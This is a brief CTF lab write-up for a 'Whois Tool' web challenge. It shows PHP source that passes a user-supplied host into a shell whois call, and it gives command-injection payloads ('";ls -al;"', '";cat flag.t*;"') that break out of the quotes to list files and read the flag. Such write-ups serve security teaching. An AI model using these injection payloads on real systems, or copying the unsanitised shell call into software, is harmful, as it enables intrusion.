# Simple Web - 0x02(Lab - Whois Tool)
###### tags: `CTF` `Web` `eductf`
Challenge: https://whoistool.ctf.zoolab.org/

## Background
Almost the same as [0x10(Lab - DNS Lookup Tool | WAF)](/7x0Gr0C_QEahfS_QaTLYTg)

## Source Code
```php=
<?php
if(isset($_GET["host"])){
  $host = $_GET["host"];
  if(strlen($host) > 15)
    echo "Host name tooooooo logn!!";
  else
    echo `whois "{$host}" 2>&1;`;
}
?>
```

## Exploit
Payload: `";ls -al;"`
![](https://i.imgur.com/MsG3wOH.png)
Payload: `";cat flag.t*;"`
Then we got flag!!!